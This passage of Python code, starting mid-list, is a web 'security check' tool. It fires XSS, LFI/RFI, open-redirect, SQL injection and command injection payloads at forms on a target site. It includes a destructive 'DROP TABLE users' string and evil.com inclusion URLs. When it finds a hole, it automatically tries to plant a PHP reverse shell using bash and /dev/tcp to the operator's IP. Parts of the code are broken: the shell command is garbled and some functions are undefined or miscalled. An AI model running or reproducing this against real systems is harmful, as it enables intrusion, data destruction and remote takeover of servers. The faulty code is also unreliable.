        "<audio src=1 href=1 onerror=\"javascript:alert(1)\"></audio>",
        "<video src=1 href=1 onerror=\"javascript:alert(1)\"></video>",
        "<body src=1 href=1 onerror=\"javascript:alert(1)\"></body>",
        "<image src=1 href=1 onerror=\"javascript:alert(1)\"></image>",
        "<object src=1 href=1 onerror=\"javascript:alert(1)\"></object>",
        "<script src=1 href=1 onerror=\"javascript:alert(1)\"></script>",
        "<svg onResize svg onResize=\"javascript:javascript:alert(1)\"></svg onResize>",
        "<title onPropertyChange title onPropertyChange=\"javascript:javascript:alert(1)\"></title onPropertyChange>",
        "<iframe onLoad iframe onLoad=\"javascript:javascript:alert(1)\"></iframe onLoad>",
        "<body onMouseEnter body onMouseEnter=\"javascript:javascript:alert(1)\"></body onMouseEnter>",
        "<body onFocus body onFocus=\"javascript:javascript:alert(1)\"></body onFocus>",
        "<frameset onScroll frameset onScroll=\"javascript:javascript:alert(1)\"></frameset onScroll>",
        "<script onReadyStateChange script onReadyStateChange=\"javascript:javascript:alert(1)\"></script onReadyStateChange>",
        "<html onMouseUp html onMouseUp=\"javascript:javascript:alert(1)\"></html onMouseUp>",
        "<body onPropertyChange body onPropertyChange=\"javascript:javascript:alert(1)\"></body onPropertyChange>",
        "<svg onLoad svg onLoad=\"javascript:javascript:alert(1)\"></svg onLoad>",
        "<body onPageHide body onPageHide=\"javascript:javascript:alert(1)\"></body onPageHide>",
        "<body onMouseOver body onMouseOver=\"javascript:javascript:alert(1)\"></body onMouseOver>",
        "<body onUnload body onUnload=\"javascript:javascript:alert(1)\"></body onUnload>",
        "<body onLoad body onLoad=\"javascript:javascript:alert(1)\"></body onLoad>",
        "<bgsound onPropertyChange bgsound onPropertyChange=\"javascript:javascript:alert(1)\"></bgsound onPropertyChange>",
        "<html onMouseLeave html onMouseLeave=\"javascript:javascript:alert(1)\"></html onMouseLeave>",
        "<html onMouseWheel html onMouseWheel=\"javascript:javascript:alert(1)\"></html onMouseWheel>",
        "<style onLoad style onLoad=\"javascript:javascript:alert(1)\"></style onLoad>",
        "<iframe onReadyStateChange iframe onReadyStateChange=\"javascript:javascript:alert(1)\"></iframe onReadyStateChange>",
        "<body onPageShow body onPageShow=\"javascript:javascript:alert(1)\"></body onPageShow>",
        "<style onReadyStateChange style onReadyStateChange=\"javascript:javascript:alert(1)\"></style onReadyStateChange>",
        "<frameset onFocus frameset onFocus=\"javascript:javascript:alert(1)\"></frameset onFocus>",
        "<applet onError applet onError=\"javascript:javascript:alert(1)\"></applet onError>",
        "<marquee onStart marquee onStart=\"javascript:javascript:alert(1)\"></marquee onStart>",
        "<script onLoad script onLoad=\"javascript:javascript:alert(1)\"></script onLoad>",
        "<html onMouseOver html onMouseOver=\"javascript:javascript:alert(1)\"></html onMouseOver>",
        "<html onMouseEnter html onMouseEnter=\"javascript:parent.javascript:alert(1)\"></html onMouseEnter>",
        "<body onBeforeUnload body onBeforeUnload=\"javascript:javascript:alert(1)\"></body onBeforeUnload>",
        "<html onMouseDown html onMouseDown=\"javascript:javascript:alert(1)\"></html onMouseDown>",
        "<marquee onScroll marquee onScroll=\"javascript:javascript:alert(1)\"></marquee onScroll>",
        "<xml onPropertyChange xml onPropertyChange=\"javascript:javascript:alert(1)\"></xml onPropertyChange>",
        "<frameset onBlur frameset onBlur=\"javascript:javascript:alert(1)\"></frameset onBlur>",
        "<applet onReadyStateChange applet onReadyStateChange=\"javascript:javascript:alert(1)\"></applet onReadyStateChange>",
        "<svg onUnload svg onUnload=\"javascript:javascript:alert(1)\"></svg onUnload>",
        "<html onMouseOut html onMouseOut=\"javascript:javascript:alert(1)\"></html onMouseOut>",
        "<body onMouseMove body onMouseMove=\"javascript:javascript:alert(1)\"></body onMouseMove>",
        "<body onResize body onResize=\"javascript:javascript:alert(1)\"></body onResize>",
        "<object onError object onError=\"javascript:javascript:alert(1)\"></object onError>",
        "<body onPopState body onPopState=\"javascript:javascript:alert(1)\"></body onPopState>",
        "<html onMouseMove html onMouseMove=\"javascript:javascript:alert(1)\"></html onMouseMove>",
        "<applet onreadystatechange applet onreadystatechange=\"javascript:javascript:alert(1)\"></applet onreadystatechange>",
        "<body onpagehide body onpagehide=\"javascript:javascript:alert(1)\"></body onpagehide>",
        "<svg onunload svg onunload=\"javascript:javascript:alert(1)\"></svg onunload>",
        "<applet onerror applet onerror=\"javascript:javascript:alert(1)\"></applet onerror>",
        "<video onerror=\"javascript:javascript:alert(1)\"><source>",
        "<form><button formaction=\"javascript:javascript:alert(1)\">X",
        "<body oninput=javascript:alert(1)><input autofocus>",
        "<frameset onload=javascript:alert(1)>",
        "<table background=\"javascript:javascript:alert(1)\">",
        "<!--<img src=\"\"><img src=x onerror=javascript:alert(1)\">-->",
        "<comment><img src=\"\"></comment><img src=x onerror=javascript:alert(1)\">",
        "<![><img src=\"\"><img src=x onerror=javascript:alert(1)//\">",
    ]
    
    findings = []

    try:
        with open('found_dirs.txt', 'r') as file:
            directories = [directory.strip() for directory in file.readlines()]
    except FileNotFoundError:
        print("found_dirs.txt not found!")
        return

    for directory in directories:
        full_url = directory
        response = requests.get(full_url)

        if response.text and not response.text.strip().startswith('/'):
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')

            for form in forms:
                action = form.get('action', '')
                action_url = urljoin(full_url, action)

                # Debugging information
                print(f"Debug: full_url = {full_url}, action = {action}, action_url = {action_url}")

                # Validate URL
                parsed = urlparse(action_url)
                if not all([parsed.scheme, parsed.netloc]):
                    print(f"Skipping invalid URL: {action_url}")
                    continue

                inputs = form.find_all('input')
                data = {}
                for input_field in inputs:
                    name = input_field.get('name', '')
                    if name:
                        for payload in payloads:
                            data[name] = payload
                            response = requests.post(action_url, data=data)

                            if payload in response.text:
                                findings.append(Fore.RED + f"Possible XSS detected in form action '{action_url}'" + Style.RESET_ALL)

    return "\n".join(findings) if findings else Fore.GREEN + "No XSS detected" + Style.RESET_ALL

#RECHECK XSS
def double_check_xss(url):
    # A more specific payload to reduce false positives
    refined_payload = "<script>alert('Confirm_XSS')</script>"
    
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    forms = soup.find_all('form')
    
    for form in forms:
        action = form.get('action', '')
        action_url = urljoin(url, action)
        inputs = form.find_all('input')
        data = {}
        
        for input_field in inputs:
            name = input_field.get('name', '')
            if name:
                data[name] = refined_payload
                
        response = requests.post(action_url, data=data)
        
        if refined_payload in response.text:
            return True
    
    return False

#LFI / RFI 
def check_lfi_rfi(url):
    # Define some common LFI payloads
    lfi_payloads = [
        "../../../../../../../../etc/passwd",
        "../../../../../../../../etc/hosts",
    ]

    # Define some common RFI payloads (point to a file you control)
    rfi_payloads = [
        "http://evil.com/malicious_file.txt",
        "https://evil.com/shell.php",
    ]

    findings = []

    # Read directories from the found_dirs.txt file
    try:
        with open('found_dirs.txt', 'r') as file:
            directories = [directory.strip() for directory in file.readlines()]
    except FileNotFoundError:
        print("found_dirs.txt not found!")
        return

    # Iterate through the provided directories
    for directory in directories:
        full_url = url + directory if directory.startswith('/') else url + '/' + directory

        # Check each LFI payload
        for payload in lfi_payloads:
            lfi_url = full_url + payload
            response = requests.get(lfi_url)
            if "root:x:" in response.text or "localhost" in response.text:
                findings.append(Fore.RED + f"Possible LFI detected in URL: {lfi_url}" + Style.RESET_ALL)

        # Check each RFI payload
        for payload in rfi_payloads:
            rfi_url = full_url + payload
            response = requests.get(rfi_url)
            if "malicious_content" in response.text: # Look for content specific to your remote file
                findings.append(Fore.RED + f"Possible RFI detected in URL: {rfi_url}" + Style.RESET_ALL)

    return "\n".join(findings) if findings else Fore.GREEN + "No LFI or RFI detected" + Style.RESET_ALL




#Open redirect
def check_open_redirect():
    # Define some common Open Redirect payloads pointing to a URL you control
    payloads = [
        "http://evil.com",
        "https://evil.com",
    ]

    findings = []

    # Read directories from the found_dirs.txt file
    try:
        with open('found_dirs.txt', 'r') as file:
            directories = [directory.strip() for directory in file.readlines()]
    except FileNotFoundError:
        print("found_dirs.txt not found!")
        return

    # Iterate through the provided directories
    for directory in directories:
        # Check each payload
        for payload in payloads:
            redirect_url = directory + "?redirect=" + payload # Adjust the parameter name based on the application
            response = requests.get(redirect_url, allow_redirects=False)

            # Check if the payload is used in the Location header (redirection)
            location_header = response.headers.get('Location', '')
            if payload in location_header:
                findings.append(Fore.RED + f"Possible Open Redirect detected in URL: {redirect_url}" + Style.RESET_ALL)

    return "\n".join(findings) if findings else Fore.GREEN + "No Open Redirect detected" + Style.RESET_ALL


#Check code injection
def check_code_injection(url, my_ip):
    # Payload to test code injection vulnerability
    payload = "<script>console.log('Success');</script>"
    response = requests.get(url, params={"param": payload})

    # Check for the presence of the injected JavaScript code in the response
    if 'Success' in response.text:
        print(Fore.RED + "Code injection detected, attempting PHP reverse shell..." + Style.RESET_ALL )
        create_php_reverse_shell(url, my_ip) # Call the PHP reverse shell function
        return Fore.RED +  "Success: Code injection detected" + Style.RESET_ALL
    else:
        return Fore.GREEN + "No code injection detected" + Style.RESET_ALL 


# SQL injection

def check_sql_injection(url, my_ip):
    
    payload = [ 
        "'; DROP TABLE users; --",
        "'; SELECT * FROM information_schema.tables; --",
        "' OR '1'='1",
        "' OR 1=1 --",
        "' OR 'a'='a",
        "'; WAITFOR DELAY '0:0:5' --",
        "' AND 1=CONVERT(int, @@version) --",
        "1' OR '1'='1",
        "1' OR 2 > 1",
        "1' OR '1'='1' --",
        "1' OR 1=1 --",
        "1' OR '1'='1'",
        "' OR a = a",
        "1' OR '1'='1'",
        "1 AND 1=1",
        "' OR 'text' = N'text'",
        "1' OR 2 > 1 --",
        "' OR ''='",
        "' OR 1=1 --",
        "' OR 'text' > 't'",
        "' OR 'text' > N'text'",
    ]
    
    injection_signatures = [
        "Database Error",
        "SQL syntax;",
        "unexpected end of SQL command",
        "Warning: mysql_fetch_array()",
        "You have an error in your SQL syntax",
        "Query failed",
        "OLE DB Provider for SQL Server",
        "Unclosed quotation mark",
        "ADODB.Field error",
        "JET Database Engine error",
        "mysql_fetch_assoc()",
        "Syntax error in query",
        "mysql_fetch_object()",
        "Invalid query",
        "Microsoft OLE DB Provider for Oracle",
        "Microsoft OLE DB Provider for SQL Server",
        "SQLException",
        "Warning: pg_exec()",
        "Warning: Supplied argument is not a valid MySQL result",
        "Warning: mysql_result()",
        "Warning: mysql_query()",
        "Warning: mysql_fetch_row()",
        "Error Executing Database Query",
        "Could not execute statement",
        "Unclosed quotation mark after the character string",
        "Warning: mysql_num_rows()",
        "Error Occurred While Processing Request",
        "Server Error in '/' Application",
        "Microsoft JET Database Engine error",
        "Error executing child request for",
        "Invalid SQL statement or JDBC",
        "Fatal error"
    ]


    try:
        with open('found_dirs.txt', 'r') as file:
            directories = [directory.strip() for directory in file.readlines()]
    except FileNotFoundError:
        print("found_dirs.txt not found!")
        return

    # Iterate through the provided directories
    for directory in directories:
        full_url = urljoin(url, directory)

        # Fetch the page content
        response = requests.get(full_url)
        soup = BeautifulSoup(response.text, 'html.parser')

        # Look for forms
        forms = soup.find_all('form')
        for form in forms:
            # Check for common login or registration fields
            if form.find('input', {'name': 'username'}) or form.find('input', {'name': 'email'}):
                # Get the form action (target URL)
                action = form.get('action', '')
                form_url = urljoin(full_url, action)

                # Prepare data to submit, iterate through the payloads
                for single_payload in payload:
                    data = {input_tag.get('name', ''): single_payload for input_tag in form.find_all('input')}

                    # Submit the form using POST method
                    try:
                        form_response = requests.post(form_url, data=data)
                    except Exception as e:
                        print(f"Error submitting form at {form_url}: {e}")
                        continue

                    # Check for signs of successful injection
                    for signature in injection_signatures:
                           if signature in form_response.text:
                               print(Fore.RED + f"Vulnerable to SQL injection in form at {form_url}, attempting PHP reverse shell..." + Style.RESET_ALL)
                               create_reverse_shell(full_url, my_ip)
                               return Fore.RED + "Success: SQL Injection detected" + Style.RESET_ALL

                    return Fore.GREEN + "Not vulnerable to SQL injection" + Style.RESET_ALL



#unix reverse shell
def check_unix_reverse_shell(url, my_ip):
    # Define some payloads that would demonstrate command injection without causing harm
    payloads = [
        "; echo 'Unix Success'",
        "&& echo 'Unix Success'",
        "| echo 'Unix Success'",
        "`echo 'Unix Success'`",
        "$(echo 'Unix Success')",
        "|| echo 'Unix Success'",
    ]

    # Read directories from the found_dirs.txt file
    try:
        with open('found_dirs.txt', 'r') as file:
            directories = [directory.strip() for directory in file.readlines()]
    except FileNotFoundError:
        print("found_dirs.txt not found!")
        return

    # Iterate through the provided directories
    for directory in directories:
        full_url = url + directory if directory.startswith('/') else url + '/' + directory

        # Fetch the page content
        response = requests.get(full_url)
        soup = BeautifulSoup(response.text, 'html.parser')

        # Look for forms
        forms = soup.find_all('form')
        for form in forms:
            # Get the form action (target URL)
            action = form.get('action', '')
            form_url = full_url + action if action.startswith('/') else action

            # Find all input fields in the form
            inputs = form.find_all('input')

            # Prepare data to submit, using each payload
            for input_field in inputs:
                name = input_field.get('name', '')
                for payload in payloads:
                    data = {name: payload}

                    # Submit the form using both GET and POST methods
                    get_response = requests.get(form_url, params=data)
                    post_response = requests.post(form_url, data=data)

                    # Check if the command output is reflected in the responses
                    if 'Unix Success' in get_response.text or 'Unix Success' in post_response.text:
                        print(Fore.RED + f"Possible command injection detected in form at {form_url}" + Style.RESET_ALL )
                        create_reverse_shell(my_ip)  # Assuming this function is defined elsewhere
                        return Fore.RED + f"Possible command injection detected in form at {form_url}" + Style.RESET_ALL

    return Fore.GREEN + "No unix command injection detected. Moving on..." + Style.RESET_ALL


#php reverse shell
def create_php_reverse_shell(url, my_ip):
    success_indicator = "PHP Success"  # A string to identify success
    payload = "<?php echo '" + success_indicator + "'; exec(\"/bin/bash -c 'wget -i >& /dev/tcp/" + my_ip + "/443 0>&1'\");?>"

    # Read directories from the found_dirs.txt file
    try:
        with open('found_dirs.txt', 'r') as file:
            directories = [directory.strip() for directory in file.readlines()]
    except FileNotFoundError:
        print("found_dirs.txt not found!")
        return

    # Iterate through the provided directories
    for directory in directories:
        full_url = url + directory if directory.startswith('/') else url + '/' + directory

        # Fetch the page content
        response = requests.get(full_url)
        soup = BeautifulSoup(response.text, 'html.parser')

        # Look for forms
        forms = soup.find_all('form')
        for form in forms:
            # Get the form action (target URL)
            action = form.get('action', '')
            form_url = full_url + action if action.startswith('/') else action

            # Find all input fields in the form
            inputs = form.find_all('input')

            # Prepare data to submit, using the payload
            for input_field in inputs:
                name = input_field.get('name', '')
                data = {name: payload}

                # Submit the form using both GET and POST methods
                get_response = requests.get(form_url, params=data)
                post_response = requests.post(form_url, data=data)

                # Check for the success indicator in the responses
                if success_indicator in get_response.text or success_indicator in post_response.text:
                    print(Fore.RED + f"PHP reverse shell successfully created in form at {form_url}" + Style.RESET_ALL)
                    return
    print(Fore.GREEN + "Failed to create PHP reverse shell. Moving on..." + Style.RESET_ALL)

# Main Function
def check_security():

    # check_sudo()

    print_banner()

    initial_url = get_target_url()

    url = handle_redirects(initial_url)
    print(f"Testing URL: {url}")

    query_ip_api(url)

    query_whois_json_api(url)

    print("\nRunning nmap for unnecessary ports and services:")
    print(run_nmap_scan(url))

    print("\nScanning directories...")
    print("This process can take a while depending on the size of your wordlist.")
    print("You will have the option to skip this part after it has run for a while.")
    directories = scan_directories(url)
    print(Fore.RED + f"Directories found: {directories}" + Style.RESET_ALL )

    print("\nChecking directory listing...")
    login_endpoints = check_directory_listing(url)
    if login_endpoints:
        print(Fore.RED + "Login endpoints found:", ', '.join(login_endpoints) + Style.RESET_ALL)
    else:
        print(Fore.GREEN + "No login endpoints found. May not be vulnerable to directory listing." + Style.RESET_ALL)
    
    print("\nChecking default credentials...")
    check_default_credentials(url, login_endpoints)  # No need to print the result here, as it's printed inside the function
    
    print("\nChecking broken authentication...")
    check_broken_authentication(url, login_endpoints)  # No need to print the result here, as it's printed inside the function

    print("\nChecking vulnerable components...")
    print(check_vulnerable_components(url))

    print("\nChecking error handling...")
    print(check_error_handling(url))

    print("\nChecking insecure headers...")
    print(check_insecure_headers(url))

    print("\nChecking Insecure Direct Object References (IDOR)...")
    print(check_idor(url))

    print("\nChecking Server-Side Request Forgery (SSRF)...")
    print(check_ssrf(url))

    print("\nChecking Unvalidated Redirects...")
    print(check_unvalidated_redirects())

    print("\nChecking Identification and Authentication Failures...")
    print(check_identification_authentication_failures())

    print("\nChecking for XXE vulnerabilities...")
    print(check_xxe())

    print("\nChecking for Missing Function-Level Access Control...")
    print(check_missing_function_level_access_control())

    print("\nChecking for Insecure Deserialization...")
    print(check_insecure_deserialization())

    # print("\nChecking for Insecure TLS configurations...")
    # print(check_insecure_tls(url))

    print("\nChecking for Exposure of Sensitive Information...")
    print(check_exposure_of_sensitive_information())

    # print("\nChecking for Inadequate Encryption Strength...")
    # print(check_inadequate_encryption_strength(url))

    print("\nChecking for Clickjacking vulnerabilities...")
    print(check_clickjacking(url))
    
    print("\nChecking for Format String Vulnerabilities...")
    parameter_name = "target_parameter"
    print(check_format_string_vulnerability(url, parameter_name))


    run_fuzz = ask_run_fuzz()
    
    if run_fuzz:
        print(f"Fuzz testing started on {url}...")
        fuzz()
        print("Fuzz testing completed.")
    else:
        print("Fuzz testing skipped.")

    print("\nChecking for Host Header Injection vulnerabilities...")
    print(check_host_header_injection(url))

    print("\nChecking for Local File Inclusion (LFI) and Remote File Inclusion (RFI) vulnerabilities...")
    print(check_lfi_rfi(url))

    print("\nChecking for Open Redirect vulnerabilities...")
    print(check_open_redirect())

    print("\nChecking XSS vulnerabilities in found directories...")
    xss_result = check_xss(directories)
    print(xss_result)
    
    if xss_result != "No XSS detected":
            print("\nDetected XSS, reconfirming...")
    
    # Double-check XSS to avoid false positives
    is_confirmed = all(double_check_xss(directory) for directory in directories)
    
    if is_confirmed:
        print("\nXSS reconfirmed, checking further vulnerabilities...")
        my_ip = get_my_ip()  # Get the local IP address
        try:
            with open('found_dirs.txt', 'r') as file:
                directories = [directory.strip() for directory in file.readlines()]
        except FileNotFoundError:
            print("found_dirs.txt not found!")
        else:
            for directory in directories:
                print("\nChecking code injection (JavaScript)...")
                if check_code_injection(directory, my_ip):
                    print("Success: Possible JavaScript code injection detected.")
                print("\nChecking SQL injection...")
                print(check_sql_injection(directory, my_ip))
                print("\nChecking UNIX reverse shell...")
                print(check_unix_reverse_shell(directory, my_ip))
    else:
        print("False positive detected for XSS. Exiting program.")
        exit(0)


if __name__ == "__main__":
    check_security()